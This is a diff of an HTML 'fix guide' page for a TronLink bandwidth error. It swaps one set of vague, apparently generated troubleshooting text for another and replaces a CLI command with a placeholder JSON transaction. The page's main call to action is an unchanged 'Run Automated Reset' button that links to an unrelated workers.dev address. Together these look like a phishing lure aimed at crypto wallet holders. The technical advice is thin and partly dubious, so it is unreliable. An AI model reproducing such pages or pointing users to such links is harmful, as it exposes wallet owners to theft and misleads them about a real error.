@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
+        font-family: BlinkMacSystemFont;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,30 +42,40 @@
 <h1>Tronlink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message indicating a bandwidth issue when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink.</li>
+<li>Users encounter an error message "Tronlink bandwidth error" when attempting to perform transactions on the TRON network, indicating insufficient bandwidth for the transaction.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions and execute smart contracts on the network.</li>
+<li>The error occurs due to the limited bandwidth available on the TRON network, which is required for transactions to be processed. Each account on the TRON network has a limited amount of bandwidth that can be used within a specific time frame.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase account bandwidth by freezing TRX tokens for bandwidth:</li>
-<li>Freeze 1000 TRX for 3 days to obtain a significant bandwidth increase</li>
-<li>Use the TRON wallet CLI to freeze tokens with the following command:</li>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Increase the account's bandwidth by freezing TRX tokens, which will allocate more bandwidth for transactions.</li>
+<li>Adjust the transaction parameters to require less bandwidth, such as reducing the transaction size.</li>
+<li>Use a different account with sufficient available bandwidth.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronwallet<span class="w"> </span>freeze<span class="w"> </span>balance<span class="w"> </span><span class="m">1000</span><span class="w"> </span><span class="m">3</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;account_address&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;recipient_address&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;transaction_value&quot;</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;options&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;feeLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;fee_limit&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;bandwidthLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;bandwidth_limit&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
+<p>Consider utilizing an external console for more advanced troubleshooting and customization options.</p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Monitor and adjust bandwidth levels according to transaction needs</li>
+<li>TRON network account with sufficient TRX tokens</li>
+<li>TronLink wallet installed and configured</li>
+<li>Basic understanding of TRON network transaction mechanics</li>
 </ul>
-<p>Prerequisites:
-* TRON wallet with sufficient TRX balance
-* TRON wallet CLI installed and configured
-* Basic understanding of TRON network and transaction mechanics
-For more complex troubleshooting, consider utilizing an external console for deeper network inspection.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">TRON Post-Quantum Signature Migration Failure</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
